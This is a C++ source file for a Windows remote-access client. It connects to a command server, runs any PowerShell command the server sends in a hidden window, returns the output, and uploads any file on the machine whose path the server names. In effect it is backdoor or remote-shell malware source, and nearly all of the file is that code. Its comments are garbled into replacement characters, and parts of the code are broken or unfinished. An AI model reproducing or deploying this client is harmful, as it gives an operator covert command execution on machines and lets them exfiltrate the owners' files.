#include <SFML/Network.hpp>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include <unordered_map>
#include <mutex>
#include <queue>
#include <variant>
#include <atomic>
#include <iostream>
#include <Windows.h>
#include <nlohmann/json.hpp>
#include <format>
#include <fstream>

#define FILE_CHUNK_SIZE 1024 * 1024

size_t min(size_t n1, size_t n2) { return n1 < n2 ? n1 : n2; }
size_t max(size_t n1, size_t n2) { return n1 > n2 ? n1 : n2; }

using json = nlohmann::json;

std::vector<std::string> chunkedFile(std::string fileDir) {
	std::vector<std::string> ret;
	std::string buffer;
	std::ifstream file(fileDir.c_str(), std::ios::binary | std::ios::ate);
	if (!file) return ret;
	size_t fileSize = file.tellg();
	file.seekg(0);

	size_t realSize = 0;
	for (size_t offset = 0; offset < fileSize; offset += FILE_CHUNK_SIZE) {
		realSize = min(FILE_CHUNK_SIZE, fileSize - offset);
		buffer.resize(realSize);
		file.read(buffer.data(), realSize);
		ret.push_back(buffer);
	}
	file.close();
	return ret;
}

std::string ExecuteCommand(const std::string& command) {
	// ������� ������ ��� �������
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);

	// ����������� �������
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	PROCESS_INFORMATION pi;
	std::string cmd = "powershell.exe \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\"; \"" + command + "\""; // ��� PowerShell: "powershell.exe -Command \"" + command + "\""

	// ������� �������
	if (!CreateProcessA(
		NULL,
		cmd.data(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		return "Error creating process";
	}

	// ��������� �������� �����������
	CloseHandle(hWritePipe);

	// ������ �����
	std::string output;
	char buffer[4096];
	DWORD bytesRead;
	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		output += buffer;
	}

	// ������� ���������� � ��������� �����������
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);

	return output;
}

void RunInThread(const std::string& command) {
	std::string result = ExecuteCommand(command);
	std::cout << std::format("Command output:\n{}\n", result);
}

class ClientsQueue {
private:
	std::queue<std::string> queue;
	std::mutex queueMutex;

public:
	void push(const std::string& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		queue.push(msg);
	}

	void push(std::queue<std::string>& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		while (!msg.empty()) {
			queue.push(msg.front());
			msg.pop();
		}
	}

	void push(const std::vector<std::string>& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		for (size_t i = 0; i < msg.size(); i++)
			queue.push(msg[i]);
	}

	std::string& front() {
		std::lock_guard<std::mutex> lock(queueMutex);
		return queue.front();
	}

	void pop() {
		std::lock_guard<std::mutex> lock(queueMutex);
		queue.pop();
	}

	bool empty() {
		std::lock_guard<std::mutex> lock(queueMutex);
		return queue.empty();
	}

	auto& getMutex() { return queueMutex; }
	auto& getQueue() { return queue; }
};

class Client {
public:
	sf::TcpSocket* sock;
	sf::IpAddress ip;
	unsigned __int16 port;
	std::thread connectThread;
	sf::Socket::Status status = sf::Socket::Status::Disconnected;

	std::thread outputThread;
	std::thread  inputThread;
	ClientsQueue output;
	ClientsQueue  input;
	std::atomic<bool> active;
	std::vector<std::string> buffer;
	std::vector<std::string> filesSending;

	void stop() {
		//  shutdown signal
		active = false;

		sock->disconnect();
		//  shutdown threads
		outputThread.join();
		inputThread.join();
		connectThread.join();
	}

	void start() {
		active = true;
		outputThread = std::thread([&]() {
			std::string str;
			sf::Socket::Status st;
			while (active.load()) {
				if (output.empty()) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					continue;
				}

				str = output.front();
				if (str.empty()) break;
				sf::Packet p; p << str;  output.pop();


			sending:
				if (!active.load()) break;
				st = sock->send(p);
				if (st == sf::Socket::Status::Error || st == sf::Socket::Status::Partial || st == sf::Socket::Status::NotReady) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					goto sending;
				}
				else if (st == sf::Socket::Status::Disconnected) {
					status = sf::Socket::Status::Disconnected;
					goto sending;
				}
			}
			});

		inputThread = std::thread([&]() {
			std::string str;
			sf::Socket::Status st;
			while (active.load()) {
				sf::Packet p;

			receiving:
				if (!active.load()) break;

				st = sock->receive(p);
				if (st == sf::Socket::Status::Error || st == sf::Socket::Status::NotReady || st == sf::Socket::Status::Partial) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					goto receiving;
				}
				else if (st == sf::Socket::Status::Disconnected) {
					status = sf::Socket::Status::Disconnected;
					goto receiving;
				}

				p >> str;  input.push(str);
				std::cout << std::format("from server {}:{} new message received:\n{}\n", sock->getRemoteAddress().value().toString(), sock->getLocalPort(), str);
			}
			});

		connectThread = std::thread([&]() {
			while (active.load()) {
				while (status == sf::Socket::Status::Done && active.load()) std::this_thread::sleep_for(std::chrono::seconds(5));
				if (!active.load()) break;

				status = sock->connect(ip, port);
			}
			
			});
	}

	Client(sf::TcpSocket* sock) : sock(sock), ip(sock->getRemoteAddress().value()), port(sock->getRemotePort()) {
		start();
	}

	Client(sf::IpAddress ip, unsigned short port) : sock(new sf::TcpSocket), ip(ip), port(port) {
		start();
	}

	~Client() {
		stop();
		sock->disconnect();
		delete sock;
	}

};

void processPacket(std::string msg, Client* cl) {
	try {
		json answer;
		if (msg.size() >= 3 &&
			static_cast<unsigned char>(msg[0]) == 0xEF &&
			static_cast<unsigned char>(msg[1]) == 0xBB &&
			static_cast<unsigned char>(msg[2]) == 0xBF) {
			answer = json::parse(msg.substr(3));
		}
		else {
			answer = json::parse(msg);
		}
		

		if (!answer.contains("action") && true) {
			std::cerr << std::format("invalid json format from server (no module action). message:\n{}\n", msg);
			return;
		}
		std::string action = answer["action"];
		if (!answer.contains("message") && true) {
			std::cerr << std::format("invalid json format from server (no module message). message:\n{}\n", msg);
			return;
		}

		if (action == "message") {
			MessageBox(NULL, answer["message"].get<std::string>().c_str(), "���������", MB_OK);
		}
		else if (action == "cmd") {
			std::string out = ExecuteCommand(answer["message"].get<std::string>());
			std::cout << std::format("command executing result:\n{}\n", out);
			json p = {
				{"action", "cmdlog"},
				{"message", out} 
			};
			cl->output.push(p.dump());
		}
		else if (action == "recvfile") {
			if (!answer.contains("message") || !answer.contains("path")) {
				std::cerr << std::format("invalid json format from server (no module message/path). message:\n{}\n", msg);
				return;
			}

			std::string homepath = answer["message"];
			std::string endpath = answer["path"];

			auto chunked = chunkedFile(homepath);
			{
				std::lock_guard<std::mutex> lock(cl->output.getMutex());
				for (auto& chunk : chunked) {
					json req = {
						{"action", "recvfile"},
						{"message", chunk},
						{"path", endpath},
						{"isfinal", (chunked.end()._Ptr == &chunk)}
					};
					cl->output.getQueue().push(req.dump());
				}
			}
		}
		else if (action == "sendfile") {
			if (!answer.contains("message") || !answer.contains("path")) {
				std::cerr << std::format("invalid json format from server (no module message/path). message:\n{}\n", msg);
				return;
			}

			
		}
	}
	catch (const std::exception& e) {
		std::cerr << std::format("invalid json format from server. Error:\n{}\n message:\n{}\n", e.what(), msg);
	}
}

int main() {
	Client client(sf::IpAddress::resolve("127.0.0.1").value(), 8080);
	system("chcp 65001");
	while (true) {
		while (client.input.empty()) std::this_thread::sleep_for(std::chrono::milliseconds(100));
		std::string msg = client.input.front();  client.input.pop();
		processPacket(msg, &client);
	}
	return 0;
}